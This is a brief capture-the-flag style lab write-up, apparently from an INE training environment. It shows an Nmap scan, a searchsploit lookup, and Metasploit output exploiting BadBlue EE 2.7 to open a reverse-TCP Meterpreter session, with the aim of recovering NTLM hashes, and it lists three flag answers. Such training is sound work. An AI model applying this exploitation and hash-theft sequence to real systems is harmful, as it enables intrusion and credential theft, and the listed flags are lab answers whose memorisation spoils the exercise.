...
* Find Administrator user NTLM hash
* Find Student user NTLM hash
...
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-23 07:28 IST
Nmap scan report for demo.ine.local (10.3.18.44)
...
┌──(root㉿attackdefense)-[~]
└─# searchsploit BadBlue | grep Metasploit
...
[*] Started reverse TCP handler on 10.10.48.5:4444 
[*] Trying target BadBlue EE 2.7 Universal...
[*] Sending stage (176198 bytes) to 10.3.18.44
[*] Meterpreter session 1 opened (10.10.48.5:4444 -> 10.3.18.44:49899) at 2026-01-23 07:31:01 +0530
...
meterpreter > 
```
Flag1: **e3c61a68f1b89ee6c8ba9507378dc88d**
Flag2: **bd4ca1fbe028f3c5066467a7f6a73b0b**
```bash
...
meterpreter > 
```
Flag3: **377af0de68bdc918d22c57a263d38326**